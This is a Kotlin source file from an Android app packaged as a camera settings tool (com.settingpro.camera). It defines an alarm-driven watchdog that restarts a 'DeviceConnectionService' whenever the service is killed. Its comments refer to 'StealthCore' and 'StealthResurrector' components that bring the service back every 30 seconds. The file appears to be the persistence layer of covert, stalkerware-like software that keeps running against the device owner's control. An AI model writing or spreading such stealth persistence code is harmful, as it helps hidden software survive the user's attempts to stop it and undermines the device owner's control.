package com.settingpro.camera.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import com.settingpro.camera.data.local.SettingsDataStore
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.util.Constants.WATCHDOG_ALARM_INTERVAL
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.flow.first
import javax.inject.Inject

/**
 * Periodic alarm receiver that restarts the service if it has been killed.
 * Fires every 5 minutes even while the device is asleep (coarse watchdog).
 * The fine-grained 30-second resurrection is handled by StealthCore/StealthResurrector.
 */
@AndroidEntryPoint
class AlarmReceiver : BroadcastReceiver() {

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    companion object {
        private const val TAG = "AlarmReceiver"
        private const val ALARM_REQUEST_CODE = 1001

        fun scheduleAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pendingIntent = buildPendingIntentForSchedule(context)

                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + WATCHDOG_ALARM_INTERVAL,
                    WATCHDOG_ALARM_INTERVAL,
                    pendingIntent
                )
                AppLogger.d(TAG, "Watchdog alarm scheduled — interval ${WATCHDOG_ALARM_INTERVAL}ms")
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error scheduling alarm", e)
            }
        }

        fun cancelAlarm(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val pendingIntent = buildPendingIntentForCancel(context) ?: run {
                    AppLogger.d(TAG, "No watchdog alarm to cancel")
                    return
                }
                alarmManager.cancel(pendingIntent)
                AppLogger.d(TAG, "Watchdog alarm cancelled")
            } catch (e: Exception) {
                AppLogger.e(TAG, "Error cancelling alarm", e)
            }
        }

        private fun buildPendingIntentForSchedule(context: Context): PendingIntent =
            PendingIntent.getBroadcast(
                context,
                ALARM_REQUEST_CODE,
                Intent(context, AlarmReceiver::class.java),
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )!!

        private fun buildPendingIntentForCancel(context: Context): PendingIntent? =
            PendingIntent.getBroadcast(
                context,
                ALARM_REQUEST_CODE,
                Intent(context, AlarmReceiver::class.java),
                PendingIntent.FLAG_NO_CREATE or PendingIntent.FLAG_IMMUTABLE
            )
    }

    override fun onReceive(context: Context, intent: Intent) {
        AppLogger.d(TAG, "Watchdog alarm fired — checking service")

        val job = kotlinx.coroutines.Job()
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob(job))
        scope.launch {
            try {
                val permissionsGranted = settingsDataStore.permissionsGranted.first()
                if (!permissionsGranted) {
                    AppLogger.d(TAG, "Permissions not yet granted — skipping service restart")
                    return@launch
                }

                if (!DeviceConnectionService.isServiceRunning()) {
                    AppLogger.w(TAG, "Service not running — restarting")
                    val serviceIntent = Intent(context, DeviceConnectionService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent)
                    } else {
                        context.startService(serviceIntent)
                    }

                    // FIX #6: Only start the resurrection loop when we actually need to
                    // restart — not unconditionally on every alarm tick. Calling
                    // startResurrectionLoop() when the service is healthy added a
                    // superfluous alarm reschedule every 5 minutes.
                    StealthCore.startResurrectionLoop(context)
                } else {
                    AppLogger.d(TAG, "Service running — watchdog alarm no-op")
                    // The StealthResurrector loop is self-perpetuating; no need to
                    // prod it here when everything is healthy.
                }

                // setInexactRepeating() handles all future deliveries automatically.
                // Do NOT call scheduleAlarm() here — it would create redundant reschedules.

            } catch (e: Exception) {
                AppLogger.e(TAG, "Error in watchdog receiver", e)
            } finally {
                job.cancel()
            }
        }
    }
}